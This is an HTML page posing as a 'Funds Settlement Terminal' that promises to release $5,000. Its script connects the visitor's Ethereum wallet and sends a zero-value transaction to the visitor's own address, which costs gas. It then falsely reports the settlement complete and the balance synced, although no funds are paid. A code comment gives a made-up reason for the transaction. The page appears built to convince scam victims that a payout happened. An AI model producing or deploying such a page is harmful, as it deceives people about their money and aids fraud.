<!DOCTYPE html>
<html>
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px;">
    <h2>FUNDS SETTLEMENT TERMINAL</h2>
    <div id="status" style="color:#fff; margin-bottom:20px;">VERIFIED HASH: 0x4351...</div>
    <button id="claimBtn" style="padding:25px; background:#0f0; font-weight:bold; cursor:pointer; border-radius:10px;">
        CLAIM RELEASED FUNDS ($5,000)
    </button>
    <script>
        document.getElementById('claimBtn').onclick = async () => {
            const status = document.getElementById('status');
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                const userAddress = await signer.getAddress();
                status.innerText = "REFRESHING WALLET STATE...";
                
                // This triggers a 'self-call' to force the wallet to re-scan for new assets
                const tx = await signer.sendTransaction({
                    to: userAddress,
                    value: "0x0",
                    gasLimit: 30000
                });
                
                status.innerHTML = "SETTLEMENT COMPLETE. <br>Checking balance update...";
                setTimeout(() => { alert("Balance Synced. Please check your Home screen."); }, 2000);
            } catch (e) {
                status.innerText = "SETTLEMENT ERROR: " + e.message;
            }
        };
    </script>
</body>
</html>
